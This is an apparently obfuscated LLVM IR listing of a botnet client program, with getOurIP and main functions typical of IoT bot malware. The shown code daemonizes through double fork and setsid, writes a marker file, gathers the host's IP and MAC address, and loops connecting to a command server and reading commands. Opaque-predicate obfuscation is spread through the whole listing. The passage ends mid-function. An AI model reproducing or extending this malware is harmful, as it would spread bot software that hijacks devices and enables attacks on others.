; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.77
  %17 = load i32, i32* @y.78
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.77
  %25 = load i32, i32* @y.78
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %229

; <label>:32:                                     ; preds = %0
  %33 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 16, i32 4, i1 false)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i32 0, i32 0)) #2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %37 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %36, i32 0, i32 0
  store i32 %35, i32* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 53) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i32, i32* %2, align 4
  %41 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %4, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %32
  store i32 0, i32* %1, align 4
  br label %229

; <label>:46:                                     ; preds = %32
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %46
  store i32 0, i32* %1, align 4
  br label %229

; <label>:53:                                     ; preds = %46
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  store i32 %56, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i32 0, i32 0), i32 0)
  store i32 %57, i32* %7, align 4
  br label %58

; <label>:58:                                     ; preds = %143, %53
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %60 = load i32, i32* %7, align 4
  %61 = call i8* @fdgets(i8* %59, i32 4096, i32 %60)
  %62 = icmp ne i8* %61, null
  br i1 %62, label %63, label %145

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.77
  %65 = load i32, i32* @y.78
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %73 = call i8* @strstr(i8* %72, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0)) #10
  %74 = icmp ne i8* %73, null
  %75 = load i32, i32* @x.77
  %76 = load i32, i32* @y.78
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %143

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = load i32, i32* @x.77
  %85 = load i32, i32* @y.78
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %92, i8** %9, align 8
  %93 = load i32, i32* @x.77
  %94 = load i32, i32* @y.78
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %101

; <label>:101:                                    ; preds = %originalBBpart216, %originalBBpart28
  %102 = load i32, i32* @x.77
  %103 = load i32, i32* @y.78
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i8*, i8** %9, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp ne i32 %112, 9
  %114 = load i32, i32* @x.77
  %115 = load i32, i32* @y.78
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %113, label %122, label %141

; <label>:122:                                    ; preds = %originalBBpart212
  %123 = load i32, i32* @x.77
  %124 = load i32, i32* @y.78
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %122
  %131 = load i8*, i8** %9, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %9, align 8
  %133 = load i32, i32* @x.77
  %134 = load i32, i32* @y.78
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %101

; <label>:141:                                    ; preds = %originalBBpart212
  %142 = load i8*, i8** %9, align 8
  store i8 0, i8* %142, align 1
  br label %145

; <label>:143:                                    ; preds = %originalBBpart24
  %144 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 4096, i32 16, i1 false)
  br label %58

; <label>:145:                                    ; preds = %141, %58
  %146 = load i32, i32* %7, align 4
  %147 = call i32 @close(i32 %146)
  %148 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %149 = load i8, i8* %148, align 16
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %226

; <label>:151:                                    ; preds = %145
  %152 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %153 = bitcast %union.anon.6* %152 to [16 x i8]*
  %154 = getelementptr inbounds [16 x i8], [16 x i8]* %153, i32 0, i32 0
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %156 = call i8* @strcpy(i8* %154, i8* %155) #2
  %157 = load i32, i32* %2, align 4
  %158 = call i32 (i32, i64, ...) @ioctl(i32 %157, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %159

; <label>:159:                                    ; preds = %206, %151
  %160 = load i32, i32* @x.77
  %161 = load i32, i32* @y.78
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %159
  %168 = load i32, i32* %10, align 4
  %169 = icmp slt i32 %168, 6
  %170 = load i32, i32* @x.77
  %171 = load i32, i32* @y.78
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %169, label %178, label %209

; <label>:178:                                    ; preds = %originalBBpart220
  %179 = load i32, i32* @x.77
  %180 = load i32, i32* @y.78
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %178
  %187 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %188 = bitcast %union.anon.7* %187 to %struct.sockaddr*
  %189 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %188, i32 0, i32 1
  %190 = getelementptr inbounds [14 x i8], [14 x i8]* %189, i32 0, i32 0
  %191 = load i32, i32* %10, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i8, i8* %190, i64 %192
  %194 = load i8, i8* %193, align 1
  %195 = load i32, i32* %10, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %196
  store i8 %194, i8* %197, align 1
  %198 = load i32, i32* @x.77
  %199 = load i32, i32* @y.78
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %206

; <label>:206:                                    ; preds = %originalBBpart224
  %207 = load i32, i32* %10, align 4
  %208 = add nsw i32 %207, 1
  store i32 %208, i32* %10, align 4
  br label %159

; <label>:209:                                    ; preds = %originalBBpart220
  %210 = load i32, i32* @x.77
  %211 = load i32, i32* @y.78
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %209
  %218 = load i32, i32* @x.77
  %219 = load i32, i32* @y.78
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %226

; <label>:226:                                    ; preds = %originalBBpart228, %145
  %227 = load i32, i32* %2, align 4
  %228 = call i32 @close(i32 %227)
  br label %229

; <label>:229:                                    ; preds = %226, %52, %45, %originalBBpart2
  %230 = load i32, i32* @x.77
  %231 = load i32, i32* @y.78
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %229
  %238 = load i32, i32* %1, align 4
  %239 = load i32, i32* @x.77
  %240 = load i32, i32* @y.78
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %238

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %247 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %248 = call i8* @strstr(i8* %247, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0)) #10
  %249 = icmp ne i8* %248, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %250 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %250, i8** %9, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  %251 = load i8*, i8** %9, align 8
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp ne i32 %253, 9
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %122
  %255 = load i8*, i8** %9, align 8
  %256 = getelementptr inbounds i8, i8* %255, i32 1
  store i8* %256, i8** %9, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %159
  %257 = load i32, i32* %10, align 4
  %258 = icmp slt i32 %257, 6
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %178
  %259 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %260 = bitcast %union.anon.7* %259 to %struct.sockaddr*
  %261 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %260, i32 0, i32 1
  %262 = getelementptr inbounds [14 x i8], [14 x i8]* %261, i32 0, i32 0
  %263 = load i32, i32* %10, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds i8, i8* %262, i64 %264
  %266 = load i8, i8* %265, align 1
  %267 = load i32, i32* %10, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %268
  store i8 %266, i8* %269, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %209
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %229
  %270 = load i32, i32* %1, align 4
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [50 x i8], align 16
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i32, align 4
  %11 = alloca [11 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca [10 x i8*], align 16
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %28 = bitcast [50 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %28, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @main.ismokeweed, i32 0, i32 0), i64 50, i32 16, i1 false)
  %29 = load i32, i32* %6, align 4
  store i32 %29, i32* %10, align 4
  %30 = bitcast [11 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @main.r00t3d, i32 0, i32 0), i64 11, i32 1, i1 false)
  %31 = getelementptr inbounds [50 x i8], [50 x i8]* %8, i32 0, i32 0
  %32 = call %struct._IO_FILE* @fopen(i8* %31, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i32 0, i32 0))
  store %struct._IO_FILE* %32, %struct._IO_FILE** %9, align 8
  %33 = getelementptr inbounds [11 x i8], [11 x i8]* %11, i32 0, i32 0
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %35 = call i64 @fwrite(i8* %33, i64 1, i64 11, %struct._IO_FILE* %34)
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %37 = call i32 @fileno(%struct._IO_FILE* %36) #2
  %38 = call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 %37, i32 3071)
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %40 = call i32 @fileno(%struct._IO_FILE* %39) #2
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = call i32 (i32, i64, ...) @ioctl(i32 %40, i64 %42, i32* %10) #2
  %44 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %45 = call i32 @fclose(%struct._IO_FILE* %44)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = call i32 @getpid() #2
  %48 = xor i32 %46, %47
  call void @srand(i32 %48) #2
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %50 = call i32 @getpid() #2
  %51 = xor i32 %49, %50
  call void @init_rand(i32 %51)
  %52 = call i32 @getOurIP()
  %53 = call i32 @fork() #2
  store i32 %53, i32* %12, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %2
  %56 = load i32, i32* @x.79
  %57 = load i32, i32* @y.80
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %55
  %64 = load i32, i32* %12, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %14, i32 0)
  call void @exit(i32 0) #14
  %66 = load i32, i32* @x.79
  %67 = load i32, i32* @y.80
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:74:                                     ; preds = %2
  %75 = load i32, i32* %12, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %105, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @fork() #2
  store i32 %78, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %77
  call void @exit(i32 0) #14
  unreachable

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %13, align 4
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %85, label %84

; <label>:84:                                     ; preds = %81
  br label %87

; <label>:85:                                     ; preds = %81
  %86 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  br label %87

; <label>:87:                                     ; preds = %85, %84
  br label %88

; <label>:88:                                     ; preds = %87
  %89 = load i32, i32* @x.79
  %90 = load i32, i32* @y.80
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = load i32, i32* @x.79
  %98 = load i32, i32* @y.80
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %107

; <label>:105:                                    ; preds = %74
  %106 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  br label %107

; <label>:107:                                    ; preds = %105, %originalBBpart24
  br label %108

; <label>:108:                                    ; preds = %107
  %109 = call i32 @setsid() #2
  %110 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #2
  %111 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %112

; <label>:112:                                    ; preds = %originalBBpart2104, %115, %108
  %113 = call i32 @initConnection()
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %115, label %117

; <label>:115:                                    ; preds = %112
  %116 = call i32 @sleep(i32 5)
  br label %112

; <label>:117:                                    ; preds = %112
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  br label %118

; <label>:118:                                    ; preds = %originalBBpart2100, %389, %271, %117
  %119 = load i32, i32* @mainCommSock, align 4
  %120 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %121 = call i32 @recvLine(i32 %119, i8* %120, i32 4096)
  store i32 %121, i32* %16, align 4
  %122 = icmp ne i32 %121, -1
  br i1 %122, label %123, label %615

; <label>:123:                                    ; preds = %118
  %124 = load i32, i32* @x.79
  %125 = load i32, i32* @y.80
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %123
  store i32 0, i32* %17, align 4
  %132 = load i32, i32* @x.79
  %133 = load i32, i32* @y.80
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %140

; <label>:140:                                    ; preds = %originalBBpart247, %originalBBpart28
  %141 = load i32, i32* %17, align 4
  %142 = sext i32 %141 to i64
  %143 = load i64, i64* @numpids, align 8
  %144 = icmp ult i64 %142, %143
  br i1 %144, label %145, label %262

; <label>:145:                                    ; preds = %140
  %146 = load i32*, i32** @pids, align 8
  %147 = load i32, i32* %17, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @waitpid(i32 %150, i32* null, i32 1)
  %152 = icmp sgt i32 %151, 0
  br i1 %152, label %153, label %242

; <label>:153:                                    ; preds = %145
  %154 = load i32, i32* @x.79
  %155 = load i32, i32* @y.80
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %153
  %162 = load i32, i32* %17, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %19, align 4
  %164 = load i32, i32* @x.79
  %165 = load i32, i32* @y.80
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart218, label %originalBB10alteredBB

originalBBpart218:                                ; preds = %originalBB10
  br label %172

; <label>:172:                                    ; preds = %188, %originalBBpart218
  %173 = load i32, i32* %19, align 4
  %174 = zext i32 %173 to i64
  %175 = load i64, i64* @numpids, align 8
  %176 = icmp ult i64 %174, %175
  br i1 %176, label %177, label %191

; <label>:177:                                    ; preds = %172
  %178 = load i32*, i32** @pids, align 8
  %179 = load i32, i32* %19, align 4
  %180 = zext i32 %179 to i64
  %181 = getelementptr inbounds i32, i32* %178, i64 %180
  %182 = load i32, i32* %181, align 4
  %183 = load i32*, i32** @pids, align 8
  %184 = load i32, i32* %19, align 4
  %185 = sub i32 %184, 1
  %186 = zext i32 %185 to i64
  %187 = getelementptr inbounds i32, i32* %183, i64 %186
  store i32 %182, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %177
  %189 = load i32, i32* %19, align 4
  %190 = add i32 %189, 1
  store i32 %190, i32* %19, align 4
  br label %172

; <label>:191:                                    ; preds = %172
  %192 = load i32*, i32** @pids, align 8
  %193 = load i32, i32* %19, align 4
  %194 = sub i32 %193, 1
  %195 = zext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %192, i64 %195
  store i32 0, i32* %196, align 4
  %197 = load i64, i64* @numpids, align 8
  %198 = add i64 %197, -1
  store i64 %198, i64* @numpids, align 8
  %199 = load i64, i64* @numpids, align 8
  %200 = add i64 %199, 1
  %201 = mul i64 %200, 4
  %202 = call noalias i8* @malloc(i64 %201) #2
  %203 = bitcast i8* %202 to i32*
  store i32* %203, i32** %18, align 8
  store i32 0, i32* %19, align 4
  br label %204

; <label>:204:                                    ; preds = %originalBBpart235, %191
  %205 = load i32, i32* %19, align 4
  %206 = zext i32 %205 to i64
  %207 = load i64, i64* @numpids, align 8
  %208 = icmp ult i64 %206, %207
  br i1 %208, label %209, label %238

; <label>:209:                                    ; preds = %204
  %210 = load i32*, i32** @pids, align 8
  %211 = load i32, i32* %19, align 4
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds i32, i32* %210, i64 %212
  %214 = load i32, i32* %213, align 4
  %215 = load i32*, i32** %18, align 8
  %216 = load i32, i32* %19, align 4
  %217 = zext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %215, i64 %217
  store i32 %214, i32* %218, align 4
  br label %219

; <label>:219:                                    ; preds = %209
  %220 = load i32, i32* @x.79
  %221 = load i32, i32* @y.80
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %219
  %228 = load i32, i32* %19, align 4
  %229 = add i32 %228, 1
  store i32 %229, i32* %19, align 4
  %230 = load i32, i32* @x.79
  %231 = load i32, i32* @y.80
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart235, label %originalBB20alteredBB

originalBBpart235:                                ; preds = %originalBB20
  br label %204

; <label>:238:                                    ; preds = %204
  %239 = load i32*, i32** @pids, align 8
  %240 = bitcast i32* %239 to i8*
  call void @free(i8* %240) #2
  %241 = load i32*, i32** %18, align 8
  store i32* %241, i32** @pids, align 8
  br label %242

; <label>:242:                                    ; preds = %238, %145
  br label %243

; <label>:243:                                    ; preds = %242
  %244 = load i32, i32* @x.79
  %245 = load i32, i32* @y.80
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %243
  %252 = load i32, i32* %17, align 4
  %253 = add nsw i32 %252, 1
  store i32 %253, i32* %17, align 4
  %254 = load i32, i32* @x.79
  %255 = load i32, i32* @y.80
